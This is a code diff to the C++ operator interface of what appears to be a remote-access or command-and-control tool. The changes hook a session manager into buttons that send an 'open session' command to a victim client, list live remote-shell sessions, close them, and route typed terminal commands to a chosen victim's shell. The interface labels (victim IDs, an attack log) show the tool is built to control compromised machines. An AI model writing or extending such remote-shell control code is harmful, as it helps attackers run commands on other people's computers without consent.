@@ -3,6 +3,8 @@
 #include "Client.hpp"
 #include "LogManager.hpp"
 #include "FileBrowser.hpp"
+#include "SessionDAO.hpp"
+#include "SessionManager.hpp"
 
 #include <raylib.h>
 #include <string>
@@ -328,6 +330,7 @@ void drawConnectionsTab(WindowState& state) {
         if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
             if (state.client.sendOpenSessionCommand(victim.uid, port)) {
                 logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));
+                SessionManager::instance().startSession(state.client.getServerHost(), port);
             } else {
                 logMan.local_log("Sending Open Session Command failed!");
             }
@@ -762,13 +765,13 @@ void drawSessionsTab(WindowState& state) {
     static char terminalOutput[4096] = "Terminal started. Type 'help' for commands.\n\n";
     static char commandInput[1024] = {0};
     static float scrollOffset = 0;
+    static SessionManager& sessionMan = SessionManager::instance();
 
     const auto& res = state.res;
 
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "Remote Shell Sessions");
 
-    //TODO: get sessions from session manager
-    static std::vector<Session> sessions {};
+    static std::vector<Session> sessions = sessionMan.getSessions();
 
     Rectangle viewRect{0, 80, res.width, res.height - 90};
 
@@ -805,7 +808,7 @@ void drawSessionsTab(WindowState& state) {
 
     //close session button
     if (GuiButton({viewRect.width - 130, viewRect.y + 2, 120, 20},  GuiIconText(ICON_CROSS, "Close Shell"))) {
-        //TODO:
+        sessionMan.close(session.uid);
     }
 
     // Terminal stuffs
@@ -889,7 +892,7 @@ void drawSessionsTab(WindowState& state) {
        GuiTextBox(commandRect, commandInput, 1024, commandEditMode)) {
         if (strlen(commandInput) > 0) {
             //AddToHistory(&history, commandInput);
-            run_terminal_command(commandInput, terminalOutput, 4096);
+            run_terminal_command(commandInput, terminalOutput, 4096, session);
             commandInput[0] = '\0';
 
             // Auto-scroll to bottom after command
